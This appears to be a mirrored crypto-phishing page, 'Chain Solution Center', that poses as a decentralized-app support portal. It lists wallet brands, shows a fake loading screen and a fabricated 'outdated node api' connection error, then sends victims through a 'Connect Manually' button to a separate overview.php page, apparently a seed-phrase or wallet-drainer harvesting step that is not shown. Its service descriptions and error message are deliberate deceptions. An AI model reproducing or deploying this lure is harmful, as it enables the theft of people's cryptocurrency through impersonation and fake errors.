<!DOCTYPE HTML>

<html>

<!-- Mirrored from rolo-etherea.hunterdouglas.com.br/rpcserviceprotocoldapp/explore.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Dec 2024 11:37:31 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>Chain Solution Center</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="src_assets/css/main.css" />
    <meta name="robots" content="noindex, nofollow" />
    <link rel="icon" href="images/favicon.png" type="image/x-icon">
    <noscript><link rel="stylesheet" href="src_assets/css/noscript.css" /></noscript>
    <script defer src="src_assets/js/lcw-widget.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
    <link rel="stylesheet" href="./cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />


    <style>
        /* Modal styles */
        .search-input{
            color:#2e3141;
        }
        #qrCodeModal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #2e3141;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999; /* Ensure it is on top */
        }
        #qrCodeContainer {
            background: #434c7f;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            position: relative; /* For close button positioning */
        }
        #qrCodeContainer h2 {
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 14px;
        }
        #qrCodeContainer p {
            margin: 20px 0 10px;
            font-size: 1em;
        }
        #qrCodeContainer a {
            color: #007BFF;
            text-decoration: none;
        }
        #closeModalButton {
            position: absolute;
            top: 10px;
            right: 10px;
            padding: 5px 10px;
            background-color: #434c7f;
            height:0;
            line-height:0;
            font-size:20px;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow:none;
        }
    </style>
</head>
<body class="is-preload">

<!-- Page Wrapper -->
<div id="page-wrapper">

    <!-- Header -->

    <header id="header" class="alt">
        <div class="livecoinwatch-widget-5" lcw-base="USD" lcw-color-tx="#999999" lcw-marquee-1="coins" lcw-marquee-2="movers" lcw-marquee-items="20" ></div>
        <h1><a href="/">Chain Solution Center</a></h1>
        <nav>
            <a href="#menu">Menu</a>
        </nav>
    </header>

    <!-- Menu -->
    <nav id="menu">
        <div class="inner">
            <h2>Menu</h2>
            <ul class="links">
                <li><a href="/">Home</a></li>
                <li><a href="explore.php">Explore</a></li>
                <li><a href="#">Contact</a></li>
            </ul>
            <a href="#" class="close">Close</a>
        </div>
    </nav>

    <!-- Banner -->
    <section id="banner">
        <div class="inner">
            <br><br><br>
            <div class="logo"><span class="icon fa-gem"></span></div>
            <h2>Explore Chain Solution Center</h2>
            <p>Embark on a journey of innovation and discovery in the Chain Solution Center. Unleash the power of decentralized applications and explore endless possibilities at your fingertips.</p>
        </div>
    </section>
    <div id="loadingScreen" class="loading-screen" style="display: none;">
        <div class="loading-content">
            <img id="loadingImage" src="#" alt="Loading...">
            <div>Loading...</div>
        </div>
    </div>
    <div id="walletDetailModal" class="wallet-detail-modal" style="display: none;">
        <div class="wallet-detail-content">
            <div class="wallet-detail-header">
                <img id="walletDetailImage" src="#" alt="Wallet Image">
                <div id="walletDetailName" class="wallet-detail-name"></div>
            </div>
            <p class="wallet-detail-message">
                <i class="fa-solid fa-triangle-exclamation"></i>&nbsp;ERROR: Wallet not detected due to outdated node api.<br>Verify you have the selected wallet installed. <br>Check your network connection or connect manually by importing with your wallet provider.
            </p>
            <div class="wallet-detail-buttons">
                <button id="retryButton">Retry</button>
                <button id="connectManuallyButton">Connect Manually</button>
            </div>
        </div>
    </div>

    <div id="myModal" class="modal" style="display: none;">
        <!-- Modal content -->
        <div class="modal-content">
            <span class="close">&times;</span>

            <!-- Search input -->
            <div class="search-container">
                <input type="text" class="search-input" id="searchInput" placeholder="Search for a wallet...">
            </div>

            <!-- Wallet grid -->
            <div class="wallet-grid" id="walletGrid">
                <!-- Example Wallets -->
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 1">
                    <div class="wallet-name">......</div>
                </div>
                <div class="wallet-item">
                    <img src="images/bg.jpg" alt="Wallet 2">
                    <div class="wallet-name">......</div>
                </div>
                <!-- Add more wallets as needed -->
            </div>


            <!-- Pagination controls -->
            <div class="pagination">
                <button id="prevPage" disabled><i class="fa-regular fa-circle-left"></i></button>
                <button id="nextPage"><i class="fa-regular fa-circle-right"></i></button>
            </div>
        </div>
    </div>



    <!-- Wrapper -->
    <section id="wrapper">

        <!-- Four -->
        <section id="four" class="wrapper alt style1">
            <div class="inner">
                <h2 class="major">Explore Services</h2>

                <section class="features">
                    <article>
                        <h3 class="major">Migration</h3>
                        <p>For seamless migration assistance and support.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Claim</h3>
                        <p>Manage your claims effortlessly and securely.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Staking</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Whitelist</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Swap</h3>
                        <p>For seamless swap assistance and support.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Gas/Network</h3>
                        <p>Fix gas fees and network congestion issues.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Slippage</h3>
                        <p>Fix slippage issues and improve your returns.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Cross Transfer</h3>
                        <p>For seamless cross transfer assistance and support.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">NFTs</h3>
                        <p>Manage your NFTs and resolve all NFT related issues.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Locked Account</h3>
                        <p>Manage locked accounts and resolve all locked account related issues.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Login Error</h3>
                        <p>Manage login errors and resolve all login related issues.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>

                    <article>
                        <h3 class="major">Assets Recovery</h3>
                        <p>Secure your assets and navigate the recovery process efficiently.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>

                    <article>
                        <h3 class="major">Node Issues</h3>
                        <p>Resolve node issues and ensure smooth network performance.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>



                    <article>
                        <h3 class="major">Wallet Glitch</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Defi Farming</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Validation</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Transaction Delay</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Bridging</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Missing/Irregular Balance</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Exchange</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Claim Airdrop</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Login Error</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Buy Token</h3>
                        <p>Maximize your returns through secure staking solutions.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                    <article>
                        <h3 class="major">Sell Token</h3>
                        <p>Manage whitelist access and permissions with ease.</p>
                        <a href="#" class="special">Click Here</a>
                    </article>
                </section>

        </section>

</div>
</section>

</section>

<!-- Footer -->
<section id="footer">
    <div class="inner">
        <h2 class="major">Get in touch</h2>
        <p>Connect with us by becoming a part of our Discord community.</p>

        <ul class="copyright">
            <li>&copy; 2024  Chain Solution Center. All rights reserved.</li>
        </ul>
    </div>
</section>

</div>

<!-- Scripts -->
<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
    const modal = document.getElementById('myModal');
    const headerHeightEm = 5.0; // Header height in em

    // Adjust modal position to account for header height
    modal.style.paddingTop = headerHeightEm + 'em';
    modal.style.paddingBottom = headerHeightEm + 'em'; // Optional, to center it vertically considering the header

    const modalContent = document.querySelector('.modal-content');
    modalContent.style.maxHeight = `calc(100vh - ${headerHeightEm * 2}em)`;

    // Modal open and close logic
    const openModalLinks = document.querySelectorAll('.special');
    const closeModal = document.querySelector('.close');

    openModalLinks.forEach(link => {
        link.addEventListener('click', function(event) {
            event.preventDefault();
            modal.style.display = 'flex';
        });
    });

    closeModal.addEventListener('click', function() {
        modal.style.display = 'none';
    });

    window.addEventListener('click', function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    });
});
</script>
<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', (event) => {
    // Get the modal and its elements
    var modal = document.getElementById("myModal");
    var openModalElements = document.querySelectorAll('.special');
    var span = document.getElementsByClassName("close")[0];
    var searchInput = document.getElementById("searchInput");
    var walletGrid = document.getElementById("walletGrid");
    var prevPageButton = document.getElementById("prevPage");
    var nextPageButton = document.getElementById("nextPage");

    // Sample data for wallets (replace with your actual data)
    var wallets = [
    { name: "MetaMask", img: "images/metamask.webp", url: "https://metamask.io/" },
    { name: "WalletConnect", img: "images/walletconn.webp", url: "https://walletconnect.com/" },
    { name: "Coinbase", img: "images/coinbase.webp", url: "https://www.coinbase.com/" },
    { name: "Trust Wallet", img: "images/trust.webp", url: "https://trustwallet.com/" },
    { name: "OKX Wallet", img: "images/okx.webp", url: "https://okx.com/" },
    { name: "Argent", img: "images/argent.webp", url: "https://www.argent.xyz/" },
    { name: "Strike X", img: "images/strikex2.webp", url: "https://www.strikeX.io/" },
    { name: "Blockchain Wallet", img: "images/blockchain.webp", url: "https://blockchain.com/" },
    { name: "Safe", img: "images/safe.webp", url: "https://www.safe.com/" },
    { name: "Rainbow Wallet", img: "images/rainbow.webp", url: "https://www.rainbow.me/" },
    { name: "Uniswap Wallet", img: "images/uniswap.webp", url: "https://uniswap.org/" },
    { name: "Zerion", img: "images/zerion.webp", url: "https://www.zerion.io/" },
    { name: "Bitget Wallet", img: "images/bitget.webp", url: "https://www.bitget.com/en/" },
    { name: "Bitski", img: "images/bitski.webp", url: "https://bitski.xyz/" },
    { name: "imToken", img: "images/imtoken.webp", url: "https://imtoken.io/" },
    { name: "ByBit Wallet", img: "images/bybit.webp", url: "https://www.bybit.com/" },
    { name: "Crypto.com Wallet", img: "images/crypto.webp", url: "https://www.crypto.com/" },
    { name: "BitFrost", img: "images/bitfrost.svg" , url: "https://www.bitfrost.com/" },
    { name: "TokenPocket Wallet", img: "images/tokenpocket.webp", url: "https://www.tokenpocket.pro/" },
    { name: "Robinhood Wallet", img: "images/Robinhood.webp", url: "https://robinhood.com/" },
    { name: "Frontier", img: "images/frontier.webp", url: "https://www.frontier.xyz/" },
    { name: "SafePal", img: "images/safepal.webp", url: "https://safepal.io/" },
    { name: "Omni", img: "images/omni.webp", url: "https://omniwallet.io/" },
    { name: "Zengo Wallet", img: "images/zengo.webp", url: "https://zengo.io/" },
    { name: "Bitverse", img: "images/bitverse.webp", url: "https://www.bitverse.io/" },
    { name: "1inch Wallet", img: "images/1inch.webp", url: "https://1inch.io/" },
    { name: "Alpha Wallet", img: "images/alpha.webp", url: "https://alphawallet.com/" },
    { name: "KEYRING wallet", img: "images/keyring.webp", url: "https://keyring.io/" },
    { name: "Binance Wallet", img: "images/binance.webp", url: "https://www.binance.com/en" },
    { name: "MEW Wallet", img: "images/mew.webp", url: "https://mewwallet.com/" },
    { name: "Exodus", img: "images/exodus.webp", url: "https://www.exodus.io/" },
    { name: "Ledger Live", img: "images/ledger.webp", url: "https://www.ledger.com/" },
    { name: "Bitpie", img: "images/bitpie.webp", url: "https://bitpie.com/" },
    { name: "LOBSTR Wallet", img: "images/lobstr.webp", url: "https://lobstr.co/" },
    { name: "MathWallet", img: "images/math.webp", url: "https://mathwallet.com/" },
    { name: "Unstoppable Wallet", img: "images/unstoppable.webp", url: "https://unstoppabledomains.com/" },
    { name: "Obvious", img: "images/obvious.webp", url: "https://www.obvious.im/" },
    { name: "Fireblocks", img: "images/fireblocks.webp", url: "https://www.fireblocks.com/" },
    { name: "Ambire Wallet", img: "images/ambire.webp", url: "https://ambire.io/" },
    { name: "Infinity Wallet", img: "images/infinity.webp", url: "https://infinitywallet.io/" },
    { name: "Bridge Wallet", img: "images/bridge.webp", url: "https://www.bridge.wallet/" },
    { name: "Internet Wallet", img: "images/internet.webp", url: "https://internetwallet.io/" },
    { name: "NOW Wallet", img: "images/now.webp", url: "https://nowwallet.io/" },
    { name: "Bitcoin.com Wallet", img: "images/bitcoin.webp", url: "https://www.bitcoin.com/" },
    { name: "ABC Wallet", img: "images/abc.webp", url: "https://abcwallet.io/" },
    { name: "Ottr Finance", img: "images/ottr.webp", url: "https://ottr.finance/" },
    { name: "Î±U Wallet", img: "images/alphasymbol.webp", url: "https://alphasymbol.com/" },
    { name: "Fncy Mobile Wallet", img: "images/fncy.webp", url: "https://fncy.io/" },
    { name: "Arculus Wallet", img: "images/arculus.webp", url: "https://arculuswallet.com/" },
    { name: "Opera Crypto Wallet", img: "images/opera.webp", url: "https://opera.com/" },
    { name: "Cobalt Wallet", img: "images/cobalt.webp", url: "https://cobaltwallet.io/" },
    { name: "Chain", img: "images/chain.webp", url: "https://chainwallet.io/" },
    { name: "Huddin", img: "images/huddin.webp", url: "https://huddin.io/" },
    { name: "Verso", img: "images/verso.webp", url: "https://www.verso.io/" },
    { name: "Jade Wallet", img: "images/jade.webp", url: "https://jade-wallet.com/" },
    { name: "HaHa", img: "images/haha.webp", url: "https://www.haha.im/" },
    { name: "Modular Wallet", img: "images/modular.webp", url: "https://modularwallet.io/" },
    { name: "Kelp", img: "images/kelp.webp", url: "https://kelp.io/" },
    { name: "Numio", img: "images/numio.webp", url: "https://num.io/" },
    { name: "Cling Wallet", img: "images/cling.webp", url: "https://cling.io/" },
    { name: "Broeam Wallet", img: "images/broeam.webp", url: "https://broeam.com/" },
    { name: "Ripio", img: "images/ripio.webp", url: "https://www.ripio.com/" },
    { name: "Sabay Wallet", img: "images/sabay.webp", url: "https://sabaywallet.com/" },
    { name: "Tokoin | Wallet", img: "images/tokoin.webp", url: "https://tokoin.com/" },
    { name: "Copiosa", img: "images/copiosa.webp", url: "https://copiosa.com/" },
    { name: "Imota", img: "images/imota.webp", url: "https://imota.im/" },
    { name: "Libera", img: "images/libera.webp", url: "https://www.libera.im/" },
    { name: "Certhis", img: "images/certhis.webp", url: "https://certhis.io/" },
    { name: "Burrito", img: "images/burrito.webp", url: "https://burrito.im/" },
    { name: "Ancrypto", img: "images/ancrypto.webp", url: "https://ancrypto.com/" },
    { name: "Cypherock cySync", img: "images/cypherock.webp", url: "https://www.cypherock.com/" },
    { name: "CVL Wallet", img: "images/cvl.webp", url: "https://cvlwallet.com/" },
    { name: "Cypher Wallet", img: "images/cypher.webp", url: "https://www.cypherwallet.io/" },
    { name: "Status", img: "images/status.webp", url: "https://status.im/" },
    { name: "Enjin Wallet", img: "images/enjin.webp", url: "https://enjin.io/" },
    { name: "Essentials", img: "images/essentials.webp", url: "https://essentials.im/" },
    { name: "Everspace", img: "images/everspace.webp", url: "https://everspace.im/" },
    { name: "BlockWallet", img: "images/blockwallet.webp", url: "https://blockwallet.io/" },
    { name: "Kriptomat", img: "images/kriptomat.webp", url: "https://kriptomat.com/" },
    { name: "Oxalus Wallet", img: "images/oxalus.webp", url: "https://www.oxalus.com/" },
    { name: "Theta Wallet", img: "images/theta.webp", url: "https://thetawallet.com/" },
    { name: "Dawn Wallet", img: "images/dawn.webp", url: "https://dawnwallet.com/" },
    { name: "Rabby", img: "images/rabby.webp", url: "https://rabby.im/" },
    { name: "Leap Cosmos Wallet", img: "images/leap.webp", url: "https://leapcosmos.com/" },
    { name: "UPBOND Wallet", img: "images/upbond.webp", url: "https://upbond.io/" },
    { name: "VIVE Wallet", img: "images/vive.webp", url: "https://www.vive.io/" },
    { name: "COCA Wallet", img: "images/coca.webp", url: "https://coca.io/" },
    { name: "BCERTin Wallet", img: "images/bcertin.webp", url: "https://bcertin.com/" },
    { name: "Monarch Wallet", img: "images/monarch.webp", url: "https://www.monarchwallet.com/" },
    { name: "Valora", img: "images/valora.webp", url: "https://valora.co/" },
    { name: "CoinCircle", img: "images/coincircle.webp", url: "https://coincircle.io/" },
    { name: "MyWalliD", img: "images/mywallid.webp", url: "https://mywallid.com/" },
    { name: "GameStop Wallet", img: "images/gamestop.webp", url: "https://gamestop.com/" },
    { name: "ParaSwap Wallet", img: "images/paraswap.webp", url: "https://paraswap.io/" },
    { name: "UvToken", img: "images/uvtoken.webp", url: "https://uvtoken.com/" },
    { name: "Sahal Wallet", img: "images/sahal.webp", url: "https://sahal.io/" },
    { name: "ApolloX", img: "images/apollox.webp", url: "https://apollox.io/" },
    { name: "Nitrogen Wallet", img: "images/nitrogen.webp", url: "https://www.nitrogenwallet.com/" },
    { name: "Loopring", img: "images/loopring.webp", url: "https://loopring.org/" },
    { name: "Bee Wallet", img: "images/bee.webp", url: "https://beewallet.io/" },
    { name: "Dohmi Wallet", img: "images/dohmi.webp", url: "https://dohmiwallet.com/" },
    { name: "Magic Eden", img: "images/magic.webp", url: "https://magiceden.io/" },
    { name: "Talk+", img: "images/talk.webp", url: "https://talkplus.io/" },
    { name: "AT.Wallet", img: "images/at.webp", url: "https://atwallet.com/" },
    { name: "ONTO", img: "images/onto.webp", url: "https://onto.im/" },
    { name: "SecuX", img: "images/secux.webp", url: "https://secux.io/" },
    { name: "Blocto", img: "images/blocto.webp", url: "https://blocto.app/" },
    { name: "Phantom", img: "images/phantom.webp", url: "https://phantom.app/" },
    { name: "Paper", img: "images/paper.webp", url: "https://paper.xyz/" },
    { name: "D'CENT Wallet", img: "images/dcent.webp", url: "https://dcentwallet.com/" },
    { name: "Frame", img: "images/frame.webp", url: "https://frame.io/" },
    { name: "Torus", img: "images/torus.webp", url: "https://tor.us/" },
    { name: "Core", img: "images/core.webp", url: "https://core.app/" },
    { name: "pier", img: "images/pier.webp", url: "https://pier.app/" },
    { name: "Brave Wallet", img: "images/brave.webp", url: "https://brave.com/" },
    { name: "Crossmint", img: "images/crossmint.webp", url: "https://crossmint.io/" },
    { name: "Keplr", img: "images/keplr.webp", url: "https://keplr.app/" },
    { name: "Linen", img: "images/linen.webp", url: "https://linen.network/" },
    { name: "Nabox", img: "images/nabox.webp", url: "https://nabox.io/" },
    { name: "BC Vault", img: "images/bcvault.webp", url: "https://bcvault.io/" },
    { name: "Neon Wallet", img: "images/neon.webp", url: "https://neonwallet.io/" },
    { name: "Absolute Wallet", img: "images/absolute.webp", url: "https://absolute.com/" },
    { name: "Sequence Wallet", img: "images/sequence.webp", url: "https://sequence.app/" },
    { name: "Ownbit", img: "images/ownbit.webp", url: "https://ownbit.io/" },
    { name: "RiceWallet", img: "images/rice.webp", url: "https://ricewallet.com/" },
    { name: "ByteBank", img: "images/bytebank.webp", url: "https://bytebank.io/" },
    { name: "MDAO Wallet", img: "images/mdao.webp", url: "https://mdao.io/" },
    { name: "Payperless", img: "images/payperless.webp", url: "https://payperless.com/" },
    { name: "Lif3 Wallet", img: "images/lif3.webp", url: "https://lif3.io/" },
    { name: "PREMA Wallet", img: "images/prema.webp", url: "https://prema.io/" },
    { name: "OneKey", img: "images/onekey.webp", url: "https://onekey.so/" },
    { name: "XDEFI Wallet", img: "images/xdefi.webp", url: "https://xdefi.io/" },
    { name: "KeepKey Wallet", img: "images/keepkey.webp", url: "https://keepkey.com/" },
    { name: "Nova Wallet", img: "images/nova.webp", url: "https://novawallet.io/" },
    { name: "Zelcore", img: "images/zelcore.webp", url: "https://zelcore.io/" },
    { name: "Kraken Wallet", img: "images/kraken.webp", url: "https://kraken.com/" },
    { name: "MoonPay Wallet", img: "images/moonpay.webp", url: "https://moonpay.com/" },
    { name: "Keychain Wallet", img: "images/keychain.webp", url: "https://keychain.io/" },
    { name: "DreamOS", img: "images/dreamos.webp", url: "https://dreamos.io/" },
    { name: "FINTOKEN", img: "images/fintoken.webp", url: "https://fintoken.io/" },
    { name: "PEAKDEFI", img: "images/peakdefi.webp", url: "https://peakdefi.com/" },
    { name: "Coin98 Super Wallet", img: "images/coin98.webp", url: "https://coin98.com/" },
    { name: "Qubic Wallet", img: "images/qubic.webp", url: "https://qubic.io/" },
    { name: "KryptoGO Wallet", img: "images/krypto.webp", url: "https://kryptogowallet.com/" },
    { name: "Abra Wallet", img: "images/abra.webp", url: "https://abra.io/" },
    { name: "Halo Wallet", img: "images/halo.webp", url: "https://halowallet.io/" },
    { name: "Binance.US", img: "images/binanceus.webp", url: "https://binance.us/" },
    { name: "Gem Wallet", img: "images/gem.webp", url: "https://gemwallet.io/" },
    ];

    var currentPage = 1;
    var itemsPerPage = 20; // Adjust the number of items per page
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingImage = document.getElementById('loadingImage');
    const walletDetailModal = document.getElementById('walletDetailModal');
    const walletDetailImage = document.getElementById('walletDetailImage');
    const walletDetailName = document.getElementById('walletDetailName');
    const retryButton = document.getElementById('retryButton');
    const connectManuallyButton = document.getElementById('connectManuallyButton');
    let currentWallet = null;

    // Function to display wallets on the current page
    function displayWallets(walletsToShow) {
        const walletGrid = document.getElementById('walletGrid');
        walletGrid.innerHTML = ''; // Clear the existing wallets

        walletsToShow.forEach(wallet => {
            const walletItem = document.createElement('div');
            walletItem.className = 'wallet-item';
            walletItem.innerHTML = `
                <img src="${wallet.img}" alt="${wallet.name}">
                <div class="wallet-name">${wallet.name}</div>
            `;
            walletItem.addEventListener('click', () => handleWalletClick(wallet));
            walletGrid.appendChild(walletItem);
        });
    }
    function handleWalletClick(wallet) {
    // Update the current wallet
    currentWallet = wallet;

    // Show loading screen
    loadingScreen.style.display = 'flex';
    loadingImage.src = wallet.img;

    // After 5 seconds, hide loading screen and show wallet detail modal
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        walletDetailModal.style.display = 'flex';
        walletDetailImage.src = wallet.img;
        walletDetailName.textContent = wallet.name;
    }, 5000);
} // Retry button logic
retryButton.addEventListener('click', () => {
    walletDetailModal.style.display = 'none';
    if (currentWallet) {
        handleWalletClick(currentWallet); // Retry by reopening the loading screen with the current wallet
    }
});

function generateRandomString(length = 35) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}




// Connect manually button logic
connectManuallyButton.addEventListener('click', () => {
    if (currentWallet) {
        const randomString = generateRandomString();
        const { name, img, url } = currentWallet;
        const queryParams = new URLSearchParams({
            url: url,
            name: name,
            icon: img,
            random: randomString
        }).toString();
        const fullUrl = `overview.php?${queryParams}`;


if (currentWallet) {
const randomString = generateRandomString();
const { name, img, url } = currentWallet;
const queryParams = new URLSearchParams({
    url: url,
    name: name,
    icon: img,
    random: randomString
}).toString();
const fullUrl = `overview.php?${queryParams}`;
window.location.href = fullUrl; // Directly navigate to the URL
}
;




    // Clear previous QR code if any
    const qrCodeElement = document.getElementById('qrCode');
    qrCodeElement.innerHTML = ''; // Clear previous QR code
    qrCode.append(qrCodeElement);

    // Update the "click to connect" link
    const clickToConnectLink = document.getElementById('clickToConnect');
    clickToConnectLink.href = fullUrl;
    clickToConnectLink.textContent = 'click to connect';

    // Display the modal
    const qrCodeModal = document.getElementById('qrCodeModal');
    qrCodeModal.style.display = 'flex';

    // Close modal button functionality
    document.getElementById('closeModalButton').onclick = () => {
        qrCodeModal.style.display = 'none';
    };


    }
});

// Close wallet detail modal when clicking outside of it
window.addEventListener('click', function(event) {
    if (event.target == walletDetailModal) {
        walletDetailModal.style.display = 'none';
    }
});

// Function to update pagination buttons
function updatePagination() {
prevPageButton.disabled = (currentPage === 1);
nextPageButton.disabled = (currentPage === Math.ceil(filteredWallets.length / itemsPerPage));
}

// Function to handle page change
function changePage(page) {
currentPage = page;
var start = (currentPage - 1) * itemsPerPage;
var end = start + itemsPerPage;
displayWallets(filteredWallets.slice(start, end));
updatePagination();
}

// Function to filter wallets based on search input
function filterWallets() {
var searchTerm = searchInput.value.toLowerCase();
filteredWallets = wallets.filter(wallet => wallet.name.toLowerCase().includes(searchTerm));
changePage(1); // Reset to the first page after filtering
}

var filteredWallets = wallets;
displayWallets(filteredWallets.slice(0, itemsPerPage)); // Initial display of wallets
updatePagination();

// Event listener for pagination buttons
prevPageButton.onclick = () => changePage(currentPage - 1);
nextPageButton.onclick = () => changePage(currentPage + 1);

// Event listener for search input
searchInput.oninput = filterWallets;

// Add click event listeners to open the modal
openModalElements.forEach(function(element) {
element.onclick = function(event) {
    event.preventDefault(); // Prevent the default action (e.g., following the link)
    modal.style.display = "flex"; // Show the modal and use flexbox to center it
}
});

// Close the modal when the close button is clicked
span.onclick = function() {
modal.style.display = "none";
}

// Close the modal when clicking outside of it
window.onclick = function(event) {
if (event.target == modal) {
    modal.style.display = "none";
}
}
});

</script>
<script src="src_assets/js/jquery.min.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
<script src="src_assets/js/jquery.scrollex.min.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
<script src="src_assets/js/browser.min.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
<script src="src_assets/js/breakpoints.min.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
<script src="src_assets/js/util.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>
<script src="src_assets/js/main.js" type="2a8efe072b599ee7179a4279-text/javascript"></script>

<script type="text/javascript">(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8b92da44beca949d',t:'MTcyNDY2NTE0NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='src_assets/challenge-platform/h/b/scripts/jsd/787bc399e22f/maind41d.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script src="./src_assets/cloudflare-static/rocket-loader.min.js" data-cf-settings="2a8efe072b599ee7179a4279-|49" defer></script></body>

</html>